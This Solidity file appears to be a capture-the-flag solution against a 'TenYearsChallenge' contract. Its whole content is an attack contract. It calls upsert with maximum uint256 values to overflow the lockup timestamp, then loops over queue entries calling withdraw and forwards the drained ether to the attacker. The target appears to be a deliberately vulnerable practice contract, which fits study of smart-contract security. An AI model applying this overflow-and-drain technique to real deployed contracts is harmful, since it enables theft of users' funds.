pragma solidity ^0.7.0;

import "./TenYearsChallenge.sol";
import "hardhat/console.sol";

contract TenYearsChallengeHack {
    uint256 public constant MAX_UINT256 = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;

    TenYearsChallenge public challenge;
    address public owner;

    constructor(address addr) {
        challenge = TenYearsChallenge(addr);
        owner = msg.sender;
    }

    receive() external payable {
    }

    function hack() public {
        // prevent MEV attacks
        require(msg.sender == owner, "only owner can hack");
        // hack
        challenge.upsert{value: 0}(MAX_UINT256, MAX_UINT256);
        challenge.upsert{value: 0}(MAX_UINT256, 1 days);
        uint head = challenge.head();
        for (uint256 i = head; i < head + 10; i++) {
            try challenge.withdraw(i) {
                msg.sender.transfer(address(this).balance);
                return;
            } catch {
                continue;
            }
        }
    }

}
